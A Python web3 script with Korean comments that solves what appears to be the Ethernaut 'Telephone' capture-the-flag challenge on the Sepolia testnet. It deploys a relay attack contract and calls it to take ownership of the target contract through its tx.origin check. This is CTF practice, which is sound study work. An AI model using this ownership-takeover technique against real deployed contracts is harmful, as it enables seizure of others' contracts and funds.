from web3 import Web3
from solcx import compile_source
from dotenv import dotenv_values
import time
import json

# 풀이
# 1. Remix IDE를 이용하여 이더리움 Sepolia 테스트넷에 Telephone 컨트랙트에 중계하는 컨트랙트 배포
#    => 컨트랙트 주소 배포 시 배포용 계정은 제2의 지갑 계정으로 생성하여야함.
# 2. 1번 과정 수행 후 owner 변수 정보 확인하여 기능이 올바르게 수행됐는지 확인
# 3. 홈페이지의 Submit Instance 버튼 실행하여 문제 클리어 

ENV_PATH = "../.env"

dict_output = dotenv_values(ENV_PATH)

RPC_URI = dict_output['WEB3_PROVIDER_URI']

CONTRACT_ADDRESS = '0x1F708C24a0D3A740cD47cC0444E9480899f3dA7D'
PRIVATE_KEY = '0x' + dict_output['USER_ADDRESS_PRIVATE_KEY']

web3 = Web3(Web3.HTTPProvider(RPC_URI))

# 연결 확인
if web3.is_connected():
    print("Connected to Network!")
else:
    print("Failed to connect to Network.")
    
PA = web3.eth.account.from_key(PRIVATE_KEY)
USER_ADDRESS = PA.address

CONTRACT_ABI = [
    {
        "type": "constructor",
        "inputs": [],
        "stateMutability": "nonpayable"
    },
    {
        "type": "function",
        "name": "changeOwner",
        "inputs": [
            {
                "name": "_owner",
                "type": "address",
                "internalType": "address"
            }
        ],
        "outputs": [],
        "stateMutability": "nonpayable",
        "signature": "0xa6f9dae1"
    },
    {
        "type": "function",
        "name": "owner",
        "inputs": [],
        "outputs": [
            {
                "name": "",
                "type": "address",
                "internalType": "address"
            }
        ],
        "stateMutability": "view",
        "constant": True,
        "signature": "0x8da5cb5b"
    }
]

with open("./contract/TelephoneAttack.sol", "r") as f:
    ATTACKER_SRC_DATA = f.read()

COMPILED_SOL = compile_source(ATTACKER_SRC_DATA, output_values=['abi', 'bin'])

contract_id, contract_interface = COMPILED_SOL.popitem()

ATTACKER_BYTECODE = contract_interface['bin']
ATTACKER_ABI = contract_interface['abi']

contract = web3.eth.contract(address=CONTRACT_ADDRESS, abi=CONTRACT_ABI)
attacker = web3.eth.contract(abi=ATTACKER_ABI, bytecode=ATTACKER_BYTECODE)

# Attacker 컨트랙트 사전 배포
tx_hash = attacker.constructor(CONTRACT_ADDRESS).transact()

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {receipt}\n")

ATTACKER_ADDRESS = receipt.contractAddress

# Attacker 컨트랙트 주소 연결
attacker = web3.eth.contract(address=ATTACKER_ADDRESS, abi=ATTACKER_ABI)

print("---- BEFORE TRANSACTION ----")

# 컨트랙트 Owner 정보 사전 확인
BEFORE_OWNER = contract.functions.owner().call()

print(f'Owner Information Before Attack: {BEFORE_OWNER}')

if BEFORE_OWNER != USER_ADDRESS:
    print("Contract's Owner is not changed!")
else:
    print("Contract's Owner is already changed!")
    exit(0)

time.sleep(2)

# TelephoneAttack 컨트랙트의 fallback 함수 호출 사전 준비
data = {
    'gas': 300000,
    'gasPrice': web3.eth.gas_price,
    'nonce': web3.eth.get_transaction_count(USER_ADDRESS),
}

tx = attacker.functions.attack().build_transaction(data)

# 트랜젝션 서명 및 전송
signed_tx = web3.eth.account.sign_transaction(tx, PRIVATE_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

# 트랜잭션 결과 확인
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {tx_receipt}\n")

time.sleep(2)

print("---- AFTER TRANSACTION ----")

# Owner 정보 변경 확인
AFTER_OWNER = contract.functions.owner().call()

print(f'Owner Information After Attack: {AFTER_OWNER}')

if AFTER_OWNER != USER_ADDRESS:
    print("Contract's Owner has not changed!")
    exit(0)
else:
    print("Contract's Owner has changed!")
